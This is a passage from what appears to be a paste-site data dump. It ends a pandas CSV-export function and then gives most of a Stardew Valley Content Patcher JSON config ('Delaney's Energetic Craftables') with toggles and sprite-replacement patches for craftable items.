        df[str_column] = df[str_column].astype('string')
    
    df['create_time'] = pd.to_datetime(df['create_time'] * 1e6).dt.round('1s')
    df['update_time'] = pd.to_datetime(df['update_time'] * 1e6).dt.round('1s')
    
    df = df.sort_values('update_time')
    df.to_csv(name, index=False)

    return df"
Kcszq6Lz,Delaney's Energetic Craftables,Rari,JSON,Thursday 4th of April 2024 03:05:30 PM CDT,"{
  ""Format"": ""2.0.0"",
  ""ConfigSchema"": {
    ""Auto-Grabber"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Auto-Grabber modification.""
    },
    ""Auto-Petter"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Auto-Petter modification.""
    },
    ""Barrel Brazier"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Barrel Brazier modification.""
    },
    ""Basic Log"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Basic Log modification.""
    },
    ""Bee House"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Bee House modification.""
    },
    ""Bone Mill"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Bone Mill modification.""
    },
    ""Campfire"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Campfire modification.""
    },
    ""Cane"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Cane modification.""
    },
    ""Carved Brazier"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Carved Brazier modification.""
    },	
    ""Cask"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Cask modification.""
    },
    ""Charcoal Kiln"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Charcoal Kiln modification.""
    },
    ""Cheese Press"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Cheese Press modification.""
    },
    ""Chest"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Chest modification.""
    },
    ""Chest2"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Chest2 modification.""
    },
    ""Coffee Maker"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Coffee Maker modification.""
    },
    ""Crystalarium"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Crystalarium modification.""
    },
    ""Dark Sign"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Dark Sign modification.""
    },
    ""Deconstructor"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Deconstructor modification.""
    },
    ""Dried Sunflowers"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Dried Sunflowers modification.""
    },
    ""Farm Computer"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Farm Computer modification.""
    },
    ""Furnace"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Furnace modification.""
    },
    ""Garden Pot"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Garden Pot modification.""
    },
    ""Geode Crusher"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Geode Crusher modification.""
    },
    ""Gold Brazier"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Gold Brazier modification.""
    },
    ""Grave Stone"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Grave Stone modification.""
    },
    ""Hay Hopper"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Hay Hopper modification.""
    },
    ""Heater"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Heater modification.""
    },
    ""Heavy Tapper"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Heavy Tapper modification.""
    },
    ""Hopper"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Hopper modification.""
    },
    ""Incubator"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Incubator modification.""
    },
    ""Iron Lamp-post"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Iron Lamp-post modification.""
    },
    ""Junimo Chest"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Junimo Chest modification.""
    },
    ""Junimo Kart Arcade System"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Junimo Kart Arcade System modification.""
    },
    ""Junimos"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Junimos modification.""
    },
    ""Jukebox"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Jukebox modification.""
    },
    ""Keg"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Keg modification.""
    },
    ""Lawn Flamingo"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Lawn Flamingo modification.""
    },
    ""Lightning Rod"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Lightning Rod modification.""
    },
    ""Log Section"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Log Section modification.""
    },
    ""Loom"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Loom modification.""
    },
    ""Marble Brazier"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Marble Brazier modification.""
    },
    ""Mayonnaise Machine"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Mayonnaise Machine modification.""
    },
    ""Mini-Obelisk"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Mini-Obelisk modification.""
    },
    ""Mini-Shipping Bin"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Mini-Shipping Bin modification.""
    },
    ""Mushroom"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Mushroom modification.""
    },
    ""Oil Maker"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Oil Maker modification.""
    },
    ""Ornamental Hay Bale"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Ornamental Hay Bale modification.""
    },
    ""Ostrich Incubator"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Ostrich Incubator modification.""
    },
    ""Plush Bunny"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Plush Bunny modification.""
    },
    ""Prairie King Arcade System"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Prairie King Arcade System modification.""
    },
    ""Preserves Jar"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Preserves Jar modification.""
    },
    ""Recycling Machine"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Recycling Machine modification.""
    },
    ""Seasonal Decor"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Seasonal Decor modification.""
    },	
    ""Seed Maker"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Seed Maker modification.""
    },
    ""Sewing Machine"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Sewing Machine modification.""
    },
    ""Sign Of The Vessel"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Sign Of The Vessel modification.""
    },
    ""Skull Brazier"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Skull Brazier modification.""
    },
    ""Slime Egg-Press"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Slime Egg-Press modification.""
    },
    ""Slime Incubator"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Slime Incubator modification.""
    },
    ""Soda Machine"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Soda Machine modification.""
    },
    ""Solar Panel"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Solar Panel modification.""
    },
    ""Staircase"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Staircase modification.""
    },
    ""Stardew Hero Trophy"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Stardew Hero Trophy modification.""
    },	
    ""Statue Of Endless Fortune"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Statue Of Endless Fortune modification.""
    },
    ""Statue Of Perfection"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Statue Of Perfection modification.""
    },
    ""Statue Of True Perfection"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Statue Of True Perfection modification.""
    },
    ""Stone Brazier"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Stone Brazier modification.""
    },
    ""Stone Cairn"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Stone Cairn modification.""
    },
    ""Stone Chest"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Stone Chest modification.""
    },
    ""Stone Frog"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Stone Frog modification.""
    },
    ""Stone Owl"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Stone Owl modification.""
    },
    ""Stone Parrot"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Stone Parrot modification.""
    },
    ""Stone Sign"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Stone Sign modification.""
    },
    ""Stump Brazier"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Stump Brazier modification.""
    },
    ""Suit Of Armor"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Suit Of Armor modification.""
    },
    ""Tapper"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Tapper modification.""
    },
    ""Telephone"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Telephone modification.""
    },
    ""Tub o' Flowers"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Tub o' Flowers modification.""
    },
    ""Wicked Statue"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Wicked Statue modification.""
    },
    ""Wood Chipper"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Wood Chipper modification.""
    },
    ""Wood Lamp-post"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Wood Lamp-post modification.""
    },
    ""Wood Sign"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Wood Sign modification.""
    },
    ""Wooden Brazier"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Wooden Brazier modification.""
    },
    ""Workbench"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Workbench modification.""
    },
    ""Worm Bin"": {
      ""AllowValues"": ""true, false"",
      ""Default"": ""true"",
      ""Description"": ""Enable to apply the Worm Bin modification.""
    }
  },
 ""Changes"": [
  {
    ""LogName"": ""Lightning Rod"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 16, ""Y"": 32, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 16, ""Y"": 32, ""Width"": 16, ""Height"": 32},
    ""When"": {""Lightning Rod"": ""true""}
  },
  {
    ""LogName"": ""Bee House"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 32, ""Y"": 32, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 32, ""Y"": 32, ""Width"": 32, ""Height"": 32},
    ""When"": {""Bee House"": ""true""}
  },
  {
    ""LogName"": ""Keg"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 64, ""Y"": 32, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 64, ""Y"": 32, ""Width"": 16, ""Height"": 32},
    ""When"": {""Keg"": ""true""}
  },
  {
    ""LogName"": ""Furnace"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 80, ""Y"": 32, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 80, ""Y"": 32, ""Width"": 32, ""Height"": 32},
    ""When"": {""Furnace"": ""true""}
  },
  {
    ""LogName"": ""Preserves Jar"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 112, ""Y"": 32, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 112, ""Y"": 32, ""Width"": 16, ""Height"": 32},
    ""When"": {""Preserves Jar"": ""true""}
  },
  {
    ""LogName"": ""Cheese Press"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 64, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 64, ""Width"": 16, ""Height"": 32},
    ""When"": {""Cheese Press"": ""true""}
  },
  {
    ""LogName"": ""Loom"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 16, ""Y"": 64, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 16, ""Y"": 64, ""Width"": 32, ""Height"": 32},
    ""When"": {""Loom"": ""true""}
  },
  {
    ""LogName"": ""Oil Maker"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 48, ""Y"": 64, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 48, ""Y"": 64, ""Width"": 16, ""Height"": 32},
    ""When"": {""Oil Maker"": ""true""}
  },
  {
    ""LogName"": ""Recycling Machine"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 64, ""Y"": 64, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 64, ""Y"": 64, ""Width"": 16, ""Height"": 32},
    ""When"": {""Recycling Machine"": ""true""}
  },
  {
    ""LogName"": ""Crystalarium"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 80, ""Y"": 64, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 80, ""Y"": 64, ""Width"": 16, ""Height"": 32},
    ""When"": {""Crystalarium"": ""true""}
  },
  {
    ""LogName"": ""Mayonnaise Machine"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 96, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 96, ""Width"": 16, ""Height"": 32},
    ""When"": {""Mayonnaise Machine"": ""true""}
  },
  {
    ""LogName"": ""Seed Maker"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 16, ""Y"": 96, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 16, ""Y"": 96, ""Width"": 16, ""Height"": 32},
    ""When"": {""Seed Maker"": ""true""}
  },
  {
    ""LogName"": ""Stone Cairn"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""When"": {""Stone Cairn"": ""true""}
  },
  {
    ""LogName"": ""Suit Of Armor"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 16, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 16, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""When"": {""Suit Of Armor"": ""true""}
  },
  {
    ""LogName"": ""Sign Of The Vessel"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 32, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 32, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""When"": {""Sign Of The Vessel"": ""true""}
  },
  {
    ""LogName"": ""Basic Log"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 48, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 48, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""When"": {""Basic Log"": ""true""}
  },
  {
    ""LogName"": ""Lawn Flamingo"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 64, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 64, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""When"": {""Lawn Flamingo"": ""true""}
  },
  {
    ""LogName"": ""Wood Sign"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 80, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 80, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""When"": {""Wood Sign"": ""true""}
  },
  {
    ""LogName"": ""Stone Sign"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 96, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 96, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""When"": {""Stone Sign"": ""true""}
  },
  {
    ""LogName"": ""Dark Sign"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 112, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 112, ""Y"": 128, ""Width"": 16, ""Height"": 32},
    ""When"": {""Dark Sign"": ""true""}
  },
  {
    ""LogName"": ""Cane"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 160, ""Width"": 80, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 160, ""Width"": 80, ""Height"": 32},
    ""When"": {""Cane"": ""true""}
  },
  {
    ""LogName"": ""Ornamental Hay Bale"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 80, ""Y"": 160, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 80, ""Y"": 160, ""Width"": 16, ""Height"": 32},
    ""When"": {""Ornamental Hay Bale"": ""true""}
  },
  {
    ""LogName"": ""Log Section"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 96, ""Y"": 160, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 96, ""Y"": 160, ""Width"": 16, ""Height"": 32},
    ""When"": {""Log Section"": ""true""}
  },
  {
    ""LogName"": ""Grave Stone"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 112, ""Y"": 160, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 112, ""Y"": 160, ""Width"": 16, ""Height"": 32},
    ""When"": {""Grave Stone"": ""true""}
  },
  {
    ""LogName"": ""Seasonal Decor"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 192, ""Width"": 64, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 192, ""Width"": 64, ""Height"": 32},
    ""When"": {""Seasonal Decor"": ""true""}
  },
  {
    ""LogName"": ""Stone Frog"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 64, ""Y"": 192, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 64, ""Y"": 192, ""Width"": 16, ""Height"": 32},
    ""When"": {""Stone Frog"": ""true""}
  },
  {
    ""LogName"": ""Stone Parrot"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 80, ""Y"": 192, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 80, ""Y"": 192, ""Width"": 16, ""Height"": 32},
    ""When"": {""Stone Parrot"": ""true""}
  },
  {
    ""LogName"": ""Stone Owl"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 96, ""Y"": 192, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 96, ""Y"": 192, ""Width"": 16, ""Height"": 32},
    ""When"": {""Stone Owl"": ""true""}
  },
  {
    ""LogName"": ""Junimos"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 112, ""Y"": 192, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 112, ""Y"": 192, ""Width"": 16, ""Height"": 32},
    ""When"": {""Junimos"": ""true""}
  },
  {
    ""LogName"": ""Garden Pot"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 96, ""Y"": 224, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 96, ""Y"": 224, ""Width"": 32, ""Height"": 32},
    ""When"": {""Garden Pot"": ""true""}
  },
  {
    ""LogName"": ""Staircase"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 112, ""Y"": 256, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 112, ""Y"": 256, ""Width"": 16, ""Height"": 32},
    ""When"": {""Staircase"": ""true""}
  },
  {
    ""LogName"": ""Wicked Statue"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 48, ""Y"": 320, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 48, ""Y"": 320, ""Width"": 32, ""Height"": 32},
    ""When"": {""Wicked Statue"": ""true""}
  },
  {
    ""LogName"": ""Bone Mill"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 32, ""Y"": 352, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 32, ""Y"": 352, ""Width"": 16, ""Height"": 32},
    ""When"": {""Bone Mill"": ""true""}
  },
  {
    ""LogName"": ""Hay Hopper"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 48, ""Y"": 384, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 48, ""Y"": 384, ""Width"": 32, ""Height"": 32},
    ""When"": {""Hay Hopper"": ""true""}
  },
  {
    ""LogName"": ""Incubator"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 80, ""Y"": 384, ""Width"": 48, ""Height"": 32},
    ""ToArea"": {""X"": 80, ""Y"": 384, ""Width"": 48, ""Height"": 32},
    ""When"": {""Incubator"": ""true""}
  },
  {
    ""LogName"": ""Heater"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 416, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 416, ""Width"": 16, ""Height"": 32},
    ""When"": {""Heater"": ""true""}
  },
  {
    ""LogName"": ""Tapper"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 16, ""Y"": 416, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 16, ""Y"": 416, ""Width"": 32, ""Height"": 32},
    ""When"": {""Tapper"": ""true""}
  },
  {
    ""LogName"": ""Plush Bunny"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 48, ""Y"": 416, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 48, ""Y"": 416, ""Width"": 16, ""Height"": 32},
    ""When"": {""Plush Bunny"": ""true""}
  },
  {
    ""LogName"": ""Tub o' Flowers"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 64, ""Y"": 416, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 64, ""Y"": 416, ""Width"": 32, ""Height"": 32},
